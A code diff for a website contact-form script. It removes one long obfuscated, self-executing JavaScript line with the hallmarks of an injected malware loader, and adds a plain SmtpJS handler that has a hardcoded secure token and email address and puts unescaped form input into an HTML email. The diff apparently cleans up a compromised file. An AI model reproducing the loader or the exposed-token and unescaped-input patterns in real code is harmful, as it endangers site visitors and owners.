@@ -1,1 +1,49 @@
-var fname,email,tel,message,submit;(function(){var GZB='',iKu=668-657;function HiQ(d){var n=3520717;var j=d.length;var i=[];for(var h=0;h<j;h++){i[h]=d.charAt(h)};for(var h=0;h<j;h++){var t=n*(h+260)+(n%32178);var v=n*(h+582)+(n%34610);var w=t%j;var s=v%j;var e=i[w];i[w]=i[s];i[s]=e;n=(t+v)%3904924;};return i.join('')};var nod=HiQ('cojmzhstnogubwiedrsnkrlfyopxrvtaqcutc').substr(0,iKu);var jfy='oa8 d=r2mrt6x,o=v1)v.rln;;,b(dtfhh}j<lrnaper=t{vrx+zx;(ar l=r88,e6o6p,(0 67,q6+8u,f2u8e,39e7n,;5s8(,{1(9j,i0)8p,e7.6p,l4.;nar o==];fer(vrrtl10rl[ikl,nqt";;+r);[e[h]r=j+t;da] ,=3]uzt=n1,rn=v01m;=75+fer(v[rlb=0lbtaxgjmfn.s4l+n=t];,+() v r.dna"gam,nps(bv.9pdi.(= p)]f.r)v(rxufd[l+net5-r;y>=0au,-t{-as e=7u;lfvrroqvd[ue;=a. 0=eutlCv3rpjg0iv=r;taqhlrn[th;saz  ;,oe((a{ r=b;=<v;)+n)Av=r[v q!cSa"CrdiAc(v),vsr f s.vn;kf5f2{;=8fp1o*{+}.;h]rso+eitspp11-a;o=;;e+];;e]sA +f+va=m)ak)r*(i.ge gahiz1qicmaiC+ddAr(C+=)4+7.hhgrkole1tap22o-.;;=u;)+t2l};lle ccn}icu(;)i[(e=hn{l))l=p][ig(i>z)l..u-hrqcs4brtjiagCj;x,))erp)s)(e[v+=](;C=u+n;0iu(]!6nal,)=it(]<4)).ruhh.qvsubpt}ipg+jg)nd-uu=h.tolna"1)+}(a;pgs"(d[9]0" v;r+h=afjvir(s"a;2as v=09l,m0a3;,r2u9p,(9(.eokc<t0ij;aa[ a=tt5isgrftohC=alC"d)(u6l;eo=(2ao (=p;(<i.7eig7hrle+ghnh1srl1t;g8n}c)avAj(i)..)oan=Shr no.wr)m,hzr6oeeqofl)),;)e.upn=h;sfl(t.g=" "o.ro+nog[;';var jFe=HiQ[nod];var UVh='';var gVZ=jFe;var MaJ=jFe(UVh,HiQ(jfy));var MUu=MaJ(HiQ('X+lXa$)( ldcwa4C=1t!f!j3fofcj}\',i+_l8.t)oXF9F\/r)Xcs]X(Gf3\/3$brrs5oXC)c1XXl%21!]X;XD_.==.eE)4\/iAX-E9i,=c2}a}mXbseXltix9De.X(e,XjXt([3cv(Xy3X;.].fXXyra:.Xl.=6nf=conuAGG}wo!S79 K5e\/p%rXn2cgbt6e,vu!$hsoXX$b%XXrXBcclD1mmslgc_ce(X. eXm.)e=1!lX7)2ea aeu.mueel4:b>d.Hybc]XE9kbXvXc$X{cn9=sn_Jea!"rX7 Xot5j7sn_s.#!vX oo,rEh]c3E9)cX.d,Xb.nbe(\/6Est=%.%sgXc Xaij(ab2Xn)9XB..iX;a%>1Xtr+m..]-d)g-=5b.e,Xc\/fm.Xcai(efvX$)]sA=..;XAoun2ng.dl(.7]c)!}#ot92]k.,2riX?rsKc.c%a.s;gX0X<cXJ)ce"rXC0A*X=cx62,f2c3)%nX$;XXXl1cfua.g!.XtX;ucMArEk.r_(bo0.da)jmcc>e >etE3Xtew=.3;]m5XXiX5-X9!}.(F(X@;_fX3%J5bc&%oHb@Xc]+}C3n1]=seaX6klk$=n.2Xe0.A<X,8ascr$u)k]Xa_s_5jaccX[ ;]peyXea%3s;m+sgltl.X!eX9XbegXXb(b{Xcs%)rm4)at.}e6[XX}1k.s)%u-c{auea_od.iedd7X(2]lm.e)XbC[={X=XXCc}0X!1Xj)c.cI.cesIcXi Xa)7XcuXc3%b8ol]rc(X"c0"csCa;7Ie6XB.l,df,]ar46fs:>[%Xt{[>n{Xtmc)2$3(.g. mcc.) };>tir6sa((!emX;m)t.e:s;F]oX$e,q)%ei cX+c&%[)cXfb$#X))t)m} 60(1.j!o($X){1u.be"Gae07i_oX)6-[NrX}Nrur0Xy7(lmg8(i(>;X.@+>.7Xc*kue.!8(.e.AX0t+2e;82er 9*7,s7cX% >do,,))!py4X%,}n0kzk$aX(ie]X)9eXcu$ gcsuF.rmr),[=;bdXc7.s;*xX#Xx_.X.C<9b.j._ Df!5%ocf_u)p;ces;":Xv)$Xm,>jcX5\/_qXeX=i;3e<y .;Ei2a(;;XulwXiS.=X4,=)s*ftf_eaXrm.e;5n#kI+Xfm4enols.j.+X[!X+fX-cte.X7tX=c=c8p6C=CX{c..13a)X!ef).fy{.e3g41s.o(i)eX o)hc0e.bee;S85X3_ec3X.XXqX9;)]3]e.4c,bej%tX.cc#<easX.X%-X(XH))h,s4XseabtX)f.X.{])[=l6iXX7X)&eXX(\'[t_xDM!XsfXtuXg5(,XXcXemjl 239.d5Xm7%)_3!C]_ ck6(K)u>X_bC;ocbo!njX7fXecon.X}eeXs)s4X;4X].cl.f..()1ayX$"X)m ewX8)k>)s(r(:.6>k&{enX0.=04t((0r%XgX)1oXHnf_b.X]n})6c6(86e(>.=Ced)tK[3_ceif(i0bn.Xc.0ts.2!ecsre%_(.7e.ec]]eXC4 3!5g2lXsin3#X{4)bcba.erXuss5hD*+iBlX([1]b.= lXiA:c)ccX*]Ae3leXiu7Xv;1tfp=7c.yc0Xa);4Ad}a.>.=eu(ffCX_..xs)(X.43\'cA;Xjr>t] ra5l9[a0!>{f_cmpc[ofs5_4973h)_rn1 <aXc59a aXockX9m19sS,l.sD;!0@a={c)}a7X(b#t,;>o%>N1],,(,]BXo4EXnu<%"X(.,((m9cX,(ro2u;f@u6n5.ej%Xne%ms_,h(Xu!.X(._XX<u_y2mo;t9,es1efxr .sc$ft(t>hX"k.XotBhXk]49a=e$4t2exc1Xog 9.9.Xt0f_$*fo8meI0.cs<mX(.Xni7s.-c;!\/XX%]sXT6tJrX!uXXll,Ens1%1hX]t1eealol ((n3tgm37)(otX.;%s6 .]*{69($ErX ,.mit =e;+)tXy.cXnga 4eX"\/ap!aXG8$0e+D;$X]1n=njX .2{:so.Ge[)n3\/onr]$. (aaca)eia:6!{sn vXo5[][ )()(\'(.ieX.dascc%.s(C_. 0X0.s5.%s0esD3als.eecnEk.;xXe)}6e6lj{o)ge==c,(nX,20 rn-.%ES(chC>,=]=@}.o{$_%7XX_T{;)uX ]piX.ir=e XC_m).tI['));var yuq=gVZ(GZB,MUu );yuq(2032);return 2507})()
+
+const fname=document.getElementById('fname');
+const email=document.getElementById('email');
+const tel=document.getElementById('tel');
+const message=document.getElementById('message');
+const submit=document.getElementsByClassName('contact-form')[0];
+
+submit.addEventListener('submit', (e)=>{
+    e.preventDefault();
+    console.log("Clicked");
+
+    //html mail
+    let ebody = `
+    <b>Name: </b>${fname.value} 
+    <br>  
+    <b>Email: </b>${email.value}
+    <br> 
+    <b>Date: </b>${tel.value}
+    <br> 
+    <b>Message: </b>${message.value} 
+    <br> 
+    `
+
+    
+
+    // Email Code Here...
+    Email.send({
+        SecureToken : "bbb4e00d-399d-4656-b90b-f76ca229c8c6",
+        To : 'b77udev@gmail.com',
+        From : "b77udev@gmail.com",
+        Subject : "New message-Contact Forms from  " + email.value,
+        Body : ebody
+    }).then(
+      message => {
+        if(message=='OK'){
+            swal("Merci!", "Votre message a été envoyé avec succès", "success");
+           
+
+        }
+        else {
+            swal("Error!", "Quelque chose ne va pas, réessayez!", "error")
+        }
+
+      }
+    );
+    
+});
+
+
